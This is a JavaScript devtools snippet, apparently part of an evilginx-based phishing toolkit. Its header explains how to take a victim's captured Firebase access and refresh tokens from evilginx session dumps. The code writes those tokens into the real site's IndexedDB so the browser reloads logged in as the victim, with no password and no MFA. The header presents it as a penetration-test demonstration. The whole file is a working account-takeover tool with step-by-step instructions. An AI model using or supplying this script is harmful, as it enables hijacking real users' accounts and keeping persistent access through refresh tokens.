 /* =============================================================================
 * browser_inject.js — session replay / account-takeover proof for Firebase apps
 * =============================================================================
 *
 * WHAT THIS IS
 *   A copy/paste devtools snippet that proves a captured session is replayable.
 *   evilginx harvests the victim's Firebase tokens; this script writes them back
 *   into a *fresh* browser's IndexedDB so the app boots up already logged in as
 *   the victim — no password, no MFA. This is the "so what" you show the client:
 *   the captured tokens are a working account-takeover, not just a password.
 *
 *   (Ported as-is from evilginx2_testing/browser_inject.js, just with the
 *   client-specific values removed. Nothing new — same Firebase IndexedDB trick.)
 *
 * HOW TO GET THE TOKENS (fill the four CONFIG values below)
 *   1. Run a capture (see USAGE.md), then dump the session:
 *          make evilginx-creds                       # summary
 *          ./evilginx/scripts/view_creds.sh --full   # full token values
 *      From the printed session, you need:
 *          accessToken   <- body_tokens.access_token   (the JWT / id_token)
 *          refreshToken  <- custom.refresh_token
 *          uid           <- custom.local_id            (Firebase user id)
 *          email         <- username
 *   2. apiKey is the target app's Firebase Web API key (starts with "AIza...").
 *      The phishkit web UI auto-pulls this from the target SPA JS bundles when you
 *      enter the real target domain. You can also find it manually in the app's
 *      bundle or any request to identitytoolkit.googleapis.com (?key=AIza...).
 *      It is per-target, not secret.
 *
 * HOW TO USE
 *   1. Open the REAL target site in a fresh browser profile (logged out).
 *   2. Open DevTools console on that origin.
 *   3. Paste the filled-in CONFIG + this whole script, hit enter.
 *   4. The page reloads authenticated as the victim.
 *
 *   Token lifetime: the accessToken (JWT) expires in ~1h. The refreshToken is the
 *   durable one — Firebase will mint fresh access tokens from it automatically
 *   once injected, so a captured refreshToken keeps the session alive well past
 *   the original JWT's expiry.
 * ========================================================================== */

(async () => {
    // ---- CONFIG: fill these from `make evilginx-creds` (see header) ----------
    const apiKey       = "AIza...REPLACE_WITH_TARGET_FIREBASE_API_KEY";
    const appName      = "[DEFAULT]";
    const accessToken  = "";   // body_tokens.access_token  (the JWT / id_token)
    const refreshToken = "";   // custom.refresh_token
    const email        = "REPLACE_WITH_CAPTURED_EMAIL";       // username
    const uid          = "REPLACE_WITH_CAPTURED_LOCAL_ID";    // custom.local_id
    const expiresInSec = 3600;
    // --------------------------------------------------------------------------

    const user = {
      uid,
      email,
      emailVerified: false,
      isAnonymous: false,
      providerData: [{
        providerId: "password",
        uid: email,
        email,
        displayName: null, photoURL: null, phoneNumber: null
      }],
      stsTokenManager: {
        refreshToken,
        accessToken,
        expirationTime: Date.now() + expiresInSec * 1000
      },
      createdAt: String(Date.now()),
      lastLoginAt: String(Date.now()),
      apiKey,
      appName
    };

    const dbReq = indexedDB.open("firebaseLocalStorageDb");
    dbReq.onupgradeneeded = () => dbReq.result.createObjectStore("firebaseLocalStorage", { keyPath: "fbase_key" });
    dbReq.onsuccess = () => {
      const db = dbReq.result;
      const tx = db.transaction("firebaseLocalStorage", "readwrite");
      tx.objectStore("firebaseLocalStorage").put({
        fbase_key: `firebase:authUser:${apiKey}:${appName}`,
        value: user
      });
      tx.oncomplete = () => { console.log("injected, reloading"); location.reload(); };
    };
  })();
